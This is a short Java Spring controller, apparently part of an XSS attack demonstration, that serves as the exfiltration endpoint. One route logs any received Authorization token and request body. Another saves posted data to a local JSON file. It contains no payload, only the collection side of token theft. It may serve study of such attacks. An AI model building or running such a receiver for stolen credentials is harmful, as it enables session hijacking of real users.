package com.ataque.xss.xss.controller;

import java.io.File;
import java.io.IOException;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;

import org.springframework.web.bind.annotation.RestController;

import com.fasterxml.jackson.databind.ObjectMapper;



@RestController
@RequestMapping
public class DadosController {

       @PostMapping("/sendToken")
        public void handleRequest(@RequestHeader("Authorization") String token, @RequestBody String body) {
            System.out.println("Token: " + token);
            System.out.println("Corpo: " + body);
            System.out.println("---------");
        }  

    @PostMapping("/sendDados")
    public ResponseEntity<Void> receiveAndSaveData(@RequestBody Object data) {
        try {
            // Converter o objeto recebido em uma representação JSON
            ObjectMapper objectMapper = new ObjectMapper();
            String jsonData = objectMapper.writeValueAsString(data);

            // Caminho para o arquivo onde você deseja salvar os dados
            String filePath = "././arquivo.json";

            // Salvar os dados no arquivo JSON
            objectMapper.writeValue(new File(filePath), jsonData);

            System.out.println("Dados recebidos e salvos com sucesso no arquivo JSON.");
            
            // Você pode retornar uma resposta de sucesso (HttpStatus.OK) se necessário
            return ResponseEntity.ok().build();
        } catch (IOException e) {
            e.printStackTrace();
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build();
        }
    }
       }
